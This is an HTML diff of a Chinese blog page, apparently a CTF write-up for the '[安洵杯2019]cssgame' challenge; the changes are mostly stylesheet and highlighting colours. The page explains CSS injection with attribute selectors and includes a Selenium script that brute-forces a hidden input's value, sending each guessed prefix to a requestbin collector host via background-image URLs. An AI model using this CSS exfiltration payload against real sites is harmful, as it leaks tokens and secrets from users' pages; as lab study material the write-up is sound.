@@ -5,7 +5,7 @@
 
 <link rel='canonical' href='https://proben1.github.io/2021/%E5%AE%89%E6%B4%B5%E6%9D%AF2019cssgame/'>
 
-<link rel="stylesheet" href="/scss/style.min.9b1fc3b09cf11c2391a1bb047fd93317cd0f3be091b6c8d36d221829af5af94d.css"><meta property='og:title' content='[安洵杯2019]cssgame'>
+<link rel="stylesheet" href="/scss/style.min.38fa0202e33e55fa6e042fc097bb63d935fa0b23f044ad99a9810606c47ab2b4.css"><meta property='og:title' content='[安洵杯2019]cssgame'>
 <meta property='og:description' content='[安洵杯 2019]cssgame 露骨的F12 https://websec.readthedocs.io/zh/latest/vuln/xss/trick/cssi.html CSS注入，如果有机会写任意CSS，那么可以做到 1.得到input栏里的token 2.得到&amp;lt;script&amp;gt'>
 <meta property='og:url' content='https://proben1.github.io/2021/%E5%AE%89%E6%B4%B5%E6%9D%AF2019cssgame/'>
 <meta property='og:site_name' content='茄子的养殖场'>
@@ -350,33 +350,33 @@
 <p>2.得到<code>&lt;script&gt;</code>里的token</p>
 <p>当然，题里用flag代替token</p>
 <p>我们这里使用CSS selectors完成攻击</p>
-<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>/*选择value值为abc的input标签*/
+<div class="highlight"><pre tabindex="0" style="color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>/*选择value值为abc的input标签*/
 </span></span><span style="display:flex;"><span>input[value=&#34;abc&#34;] { }
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>/*选择value值以a开头的input标签 */
 </span></span><span style="display:flex;"><span>input[value^=&#34;a&#34;] { }
 </span></span></code></pre></div><p>注入代码：</p>
-<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>input[name=flag][value^=&#34;b&#34;] ~ * {background-image: url(&#34;http://x.x.x.x/b&#34;);}
+<div class="highlight"><pre tabindex="0" style="color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>input[name=flag][value^=&#34;b&#34;] ~ * {background-image: url(&#34;http://x.x.x.x/b&#34;);}
 </span></span></code></pre></div><p>更换选择的值，选择到了就加载对应的background-image</p>
 <p>~ *简单理解为防止出现background-image不加载的情况</p>
-<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># encoding = utf-8</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#111">string</span> 
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> <span style="color:#111">selenium</span> <span style="color:#f92672">import</span> <span style="color:#111">webdriver</span>	
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#111">time</span>
+<div class="highlight"><pre tabindex="0" style="color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#93a1a1;font-style:italic"># encoding = utf-8</span>
+</span></span><span style="display:flex;"><span><span style="color:#dc322f;font-weight:bold">import</span> <span style="color:#268bd2">string</span> 
+</span></span><span style="display:flex;"><span><span style="color:#dc322f;font-weight:bold">from</span> <span style="color:#268bd2">selenium</span> <span style="color:#dc322f;font-weight:bold">import</span> <span style="color:#268bd2">webdriver</span>	
+</span></span><span style="display:flex;"><span><span style="color:#dc322f;font-weight:bold">import</span> <span style="color:#268bd2">time</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#111">url</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#39;http://df3ac406-f5d0-4459-af64-3ff82a3d9f39.node4.buuoj.cn:81/&#39;</span>
-</span></span><span style="display:flex;"><span><span style="color:#111">driver</span> <span style="color:#f92672">=</span>  <span style="color:#111">driver</span><span style="color:#f92672">=</span><span style="color:#111">webdriver</span><span style="color:#f92672">.</span><span style="color:#111">Chrome</span><span style="color:#111">(</span><span style="color:#d88200">&#34;F:</span><span style="color:#8045ff">\\</span><span style="color:#d88200">chromedriver_win32</span><span style="color:#8045ff">\\</span><span style="color:#d88200">chromedriver.exe&#34;</span> <span style="color:#111">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#111">flag</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#39;&#39;</span>
-</span></span><span style="display:flex;"><span><span style="color:#111">s</span> <span style="color:#f92672">=</span> <span style="color:#111">string</span><span style="color:#f92672">.</span><span style="color:#111">digits</span><span style="color:#f92672">+</span><span style="color:#111">string</span><span style="color:#f92672">.</span><span style="color:#111">ascii_letters</span><span style="color:#f92672">+</span><span style="color:#d88200">&#39;{&#39;</span><span style="color:#f92672">+</span><span style="color:#d88200">&#39;}&#39;</span><span style="color:#f92672">+</span><span style="color:#d88200">&#39;_&#39;</span>   <span style="color:#75715e">#可见字符</span>
-</span></span><span style="display:flex;"><span><span style="color:#00a8c8">for</span> <span style="color:#111">i</span> <span style="color:#f92672">in</span> <span style="color:#111">s</span><span style="color:#111">:</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#111">flag</span> <span style="color:#f92672">+=</span> <span style="color:#111">i</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#111">string</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#39;input[name=flag][value^=&#34;</span><span style="color:#d88200">%s</span><span style="color:#d88200">&#34;] ~ * {background-image: url(&#34;http://http.requestbin.buuoj.cn/1q89at51/</span><span style="color:#d88200">%s</span><span style="color:#d88200">&#34;);}&#39;</span><span style="color:#f92672">%</span><span style="color:#111">(</span><span style="color:#111">flag</span><span style="color:#111">,</span> <span style="color:#111">flag</span><span style="color:#111">)</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#111">data</span> <span style="color:#f92672">=</span> <span style="color:#111">{</span><span style="color:#d88200">&#34;css&#34;</span><span style="color:#111">:</span> <span style="color:#111">string</span><span style="color:#111">}</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#111">driver</span><span style="color:#f92672">.</span><span style="color:#111">get</span><span style="color:#111">(</span><span style="color:#111">url</span><span style="color:#111">)</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#111">css</span> <span style="color:#f92672">=</span> <span style="color:#111">driver</span><span style="color:#f92672">.</span><span style="color:#111">find_element_by_name</span><span style="color:#111">(</span><span style="color:#d88200">&#39;css&#39;</span><span style="color:#111">)</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#111">css</span><span style="color:#f92672">.</span><span style="color:#111">send_keys</span><span style="color:#111">(</span><span style="color:#111">string</span><span style="color:#111">)</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#111">driver</span><span style="color:#f92672">.</span><span style="color:#111">find_element_by_xpath</span><span style="color:#111">(</span><span style="color:#d88200">&#34;//input[@type=&#39;submit&#39;]&#34;</span><span style="color:#111">)</span><span style="color:#f92672">.</span><span style="color:#111">click</span><span style="color:#111">()</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#111">flag</span><span style="color:#f92672">=</span> <span style="color:#d88200">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">url</span> = <span style="color:#2aa198">&#39;http://df3ac406-f5d0-4459-af64-3ff82a3d9f39.node4.buuoj.cn:81/&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">driver</span> =  <span style="color:#268bd2">driver</span>=<span style="color:#268bd2">webdriver</span>.<span style="color:#268bd2">Chrome</span>(<span style="color:#2aa198">&#34;F:</span><span style="color:#2aa198">\\</span><span style="color:#2aa198">chromedriver_win32</span><span style="color:#2aa198">\\</span><span style="color:#2aa198">chromedriver.exe&#34;</span> )
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">flag</span> = <span style="color:#2aa198">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">s</span> = <span style="color:#268bd2">string</span>.<span style="color:#268bd2">digits</span>+<span style="color:#268bd2">string</span>.<span style="color:#268bd2">ascii_letters</span>+<span style="color:#2aa198">&#39;{&#39;</span>+<span style="color:#2aa198">&#39;}&#39;</span>+<span style="color:#2aa198">&#39;_&#39;</span>   <span style="color:#93a1a1;font-style:italic">#可见字符</span>
+</span></span><span style="display:flex;"><span><span style="color:#859900">for</span> <span style="color:#268bd2">i</span> <span style="color:#859900">in</span> <span style="color:#268bd2">s</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#268bd2">flag</span> += <span style="color:#268bd2">i</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#268bd2">string</span> = <span style="color:#2aa198">&#39;input[name=flag][value^=&#34;</span><span style="color:#2aa198">%s</span><span style="color:#2aa198">&#34;] ~ * {background-image: url(&#34;http://http.requestbin.buuoj.cn/1q89at51/</span><span style="color:#2aa198">%s</span><span style="color:#2aa198">&#34;);}&#39;</span>%(<span style="color:#268bd2">flag</span>, <span style="color:#268bd2">flag</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#268bd2">data</span> = {<span style="color:#2aa198">&#34;css&#34;</span>: <span style="color:#268bd2">string</span>}
+</span></span><span style="display:flex;"><span>        <span style="color:#268bd2">driver</span>.<span style="color:#268bd2">get</span>(<span style="color:#268bd2">url</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#268bd2">css</span> = <span style="color:#268bd2">driver</span>.<span style="color:#268bd2">find_element_by_name</span>(<span style="color:#2aa198">&#39;css&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#268bd2">css</span>.<span style="color:#268bd2">send_keys</span>(<span style="color:#268bd2">string</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#268bd2">driver</span>.<span style="color:#268bd2">find_element_by_xpath</span>(<span style="color:#2aa198">&#34;//input[@type=&#39;submit&#39;]&#34;</span>).<span style="color:#268bd2">click</span>()
+</span></span><span style="display:flex;"><span>        <span style="color:#268bd2">flag</span>= <span style="color:#2aa198">&#39;&#39;</span>
 </span></span></code></pre></div><p>麻了，这个脚本跑多了靶机就没反应了，然后就要重启靶机……神奇</p>
 
 </section>
